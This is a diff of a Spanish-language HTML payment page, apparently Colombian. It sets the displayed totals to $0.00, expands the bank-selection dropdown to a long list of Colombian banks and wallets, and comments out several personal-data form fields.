@@ -40,7 +40,7 @@
                         </tr>
                         <tr>
                             <td class="label-col">Usuario</td>
-                            <td class="value-col">643****</td> </tr>
+                            <td class="value-col">****</td> </tr>
                         <tr>
                             <td class="label-col">Correo</td>
                             <td class="value-col">
@@ -79,11 +79,11 @@
                             <tr class="row-total">
                                 <td>Total</td>
                                 <td id="lblValorTotal" style="font-style: italic;">$0.00</td>
-                                <td>$5.000</td>
+                                <td>$0.00</td>
                             </tr>
                             <tr>
                                 <td colspan="3" style="text-align: right; padding-top: 15px; font-weight: 700;">
-                                    Total a pagar &nbsp;&nbsp;&nbsp; <span id="lblTotalFinal" style="font-size: 16px;">$5.000</span>
+                                    Total a pagar &nbsp;&nbsp;&nbsp; <span id="lblTotalFinal" style="font-size: 16px;">$0.00</span>
                                 </td>
                             </tr>
                         </tbody>
@@ -106,10 +106,50 @@
                         <label class="form-label">Bancos *</label>
                         <select class="form-control-line" id="selectBanco">
                             <option>A continuación seleccione su banco *</option>
-                            <option>Bancolombia</option>
-                            <option>Davivienda</option>
-                            <option>Banco de Bogotá</option>
-                            <option>Nequi</option>
+                            <option value="" disabled selected>Seleccione una opción</option>
+                            <option>BANCOLOMBIA</option>
+                            <option>NEQUI</option>
+                            <option>DAVIPLATA</option>
+                            <option>BANCO DAVIVIENDA</option>
+                            <option>BANCO DE BOGOTA</option>
+                            <option>BANCO BBVA COLOMBIA S.A</option>
+                            <option>SCOTIABANK COLPATRIA</option>
+                            <option>BANCO DE OCCIDENTE</option>
+                            <option>BANCO CAJA SOCIAL</option>
+                            <option>BANCO AV VILLAS</option>
+                            <option>NU. COLOMBIA COMPAÑIA DE FINANCIAMIENTO S.A.</option>
+                            <option>LULO BANK</option>
+                            <option>RAPPIPAY</option>
+                            <option>ALIANZA FIDUCIARIA</option>
+                            <option>BANCAMIA S.A.</option>
+                            <option>BANCO AGRARIO</option>
+                            <option>BANCO COOPERATIVO COOPCENTRAL</option>
+                            <option>BANCO CREDIFINANCIERA</option>
+                            <option>BANCO FALABELLA</option>
+                            <option>BANCO FINANDINA S.A. BIC</option>
+                            <option>BANCO GNB SUDAMERIS</option>
+                            <option>BANCO ITAU</option>
+                            <option>BANCO MUNDO MUJER S.A.</option>
+                            <option>BANCO PICHINCHA S.A.</option>
+                            <option>BANCO POPULAR</option>
+                            <option>BANCO PROCREDIT</option>
+                            <option>BANCO SANTANDER COLOMBIA</option>
+                            <option>BANCO SERFINANZA</option>
+                            <option>BANCO UNION antes GIROS</option>
+                            <option>BANCOOMEVA S.A.</option>
+                            <option>CFA COOPERATIVA FINANCIERA</option>
+                            <option>CITIBANK</option>
+                            <option>COLTEFINANCIERA</option>
+                            <option>CONFIAR COOPERATIVA FINANCIERA</option>
+                            <option>COOFINEP COOPERATIVA FINANCIERA</option>
+                            <option>COTRAFA</option>
+                            <option>CREZCAMOS S.A. COMPAÑÍA DE FINANCIAMIENTO</option>
+                            <option>DALE</option>
+                            <option>IRIS</option>
+                            <option>JFK COOPERATIVA FINANCIERA</option>
+                            <option>JP MORGAN</option>
+                            <option>MOVII S.A.</option>
+                            <option>UALÁ</option>
                         </select>
                     </div>
 
@@ -118,24 +158,24 @@
                         <input type="email" class="form-control-line" placeholder="Ingrese su correo electrónico" id="formCorreo">
                     </div>
 
-                    <div class="form-group">
+                    <!-- <div class="form-group">
                         <label class="form-label">Tipo de Identificación *</label>
                         <select class="form-control-line" id="formTipoId">
                             <option>Cédula de Ciudadanía</option>
                             <option>NIT</option>
                             <option>Cédula de Extranjería</option>
                         </select>
-                    </div>
+                    </div> -->
 
-                    <div class="form-group">
+                    <!-- <div class="form-group">
                         <label class="form-label">Tipo de persona *</label>
                         <select class="form-control-line">
                             <option>Natural</option>
                             <option>Jurídica</option>
                         </select>
-                    </div>
+                    </div> -->
 
-                    <div class="form-group">
+                    <!-- <div class="form-group">
                         <label class="form-label">Identificación *</label>
                         <input type="text" class="form-control-line" placeholder="Ingrese identificación." id="formNumId">
                     </div>
@@ -148,12 +188,12 @@
                     <div class="form-group">
                         <label class="form-label">Dirección *</label>
                         <input type="text" class="form-control-line" placeholder="Ingrese dirección." id="formDireccion">
-                    </div>
+                    </div> -->
 
-                    <div class="form-group">
+                    <!-- <div class="form-group">
                         <label class="form-label">Teléfono/celular *</label>
                         <input type="text" class="form-control-line" placeholder="Ingrese teléfono/celular" id="formCelular">
-                    </div>
+                    </div> -->
 
                     <div class="actions-container">
                         <button type="button" class="btn-action btn-pay">Iniciar Pago</button>
@@ -208,5 +248,4 @@
 
     <script src="js/pago.js"></script>
 </body>
-
 </html>
